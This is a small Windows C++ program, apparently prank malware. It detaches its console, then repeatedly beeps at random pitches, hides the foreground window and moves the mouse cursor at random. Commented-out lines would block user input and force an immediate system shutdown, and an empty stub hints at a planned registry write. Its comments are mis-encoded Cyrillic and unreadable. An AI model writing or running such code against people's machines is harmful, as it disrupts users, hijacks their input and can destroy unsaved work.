#include <iostream>
#include <windows.h>
#include <stdlib.h>
#include <Winuser.h>
#include <stdio.h>


using namespace std;

void Regedit(){
	
	
}
int main(){
	
	Sleep(1000);
	printf("It's show time!\n'");
	Sleep(100);
	
	FreeConsole(); // óáèðàåòñÿ êîíñîëü
	Regedit(); //çàïèñü
	
	int i = 0;
	while(i < 10){
		//BlockInput(true); //áëîê ââîäà
		Beep(2000 + rand()%20000, 1000 + rand()%2000);
		HWND window = GetForegroundWindow();
		ShowWindow(window, SW_HIDE);
		
		SetCursorPos(rand()%1920, rand()%720); // ïåðåíîñ êóðñîðà
		i++;
	}
	
	
	//system("shutdown.exe -s -t 00");
	
	return 0;
} 
